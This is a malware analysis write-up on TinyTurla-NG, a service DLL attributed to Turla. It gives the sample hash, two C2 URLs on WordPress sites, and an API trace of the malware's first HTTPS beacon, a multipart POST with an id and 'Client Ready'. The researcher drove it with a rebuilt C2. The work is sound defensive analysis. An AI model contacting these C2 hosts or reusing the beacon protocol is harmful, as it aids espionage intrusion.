SHA256 : 267071DF79927ABD1E57F57106924DD8A68E1C4ED74E7B69403CDCDF6E6A453B  
sample source : https://bazaar.abuse.ch/sample/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b/  
VT : https://www.virustotal.com/gui/file/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b  
Report: https://blog.talosintelligence.com/tinyturla-next-generation/  


C2 :  
https://thefinetreats.com/wp-content/themes/twentyseventeen/rss-old.php  
https://hanagram.jp/wp/wp-content/themes/hanagram/rss-old.php  

Analyzed sample is a 64bit Service DLL attributed to TURLA by TALOS and named TinyTurla-NG.

Results are shared in two files :

    logs.txt which contains an execution trace of the malware until it connects to a C2 and execute 2 chosen commands
    conf.txt which contains the configuration used to analyse this sample, notably the list of API call filtered from the logs

**Commentary**

Analysed sample is already well described in the TALOS report so I won't go into details.  
For this analysis, I chose to rebuild a small C2 and order the malware to execute the following commands while supervised :  

- dir C:\users  
- get https://hanagram.jp/hanagram.cert toto.cer  

---

First Beaconing to a reachable C2 :  

```html
[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803410
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4850
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66b470
[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F668
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6E40
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000F43F5920B0
[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6E40
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xbe
[RET] 0x7fff146bd38b in [tinyturla.dll]

Thread created by monitored process : Now monitoring [pid 0x254][tid 0x2d4]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000F43F5920B0
[PAR] LPCVOID   lpBuffer                 : 0x000000F43F8AE4C0
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "Client Ready" <-- Ready for buisiness>
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xbe
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F6C0
[RET] 0x7fff146bd3f2 in [tinyturla.dll]
```

As mentionned in the report the first beaconing contains the "Client Ready" message to signal the C2 that the is malware is up and ready to receive orders.  







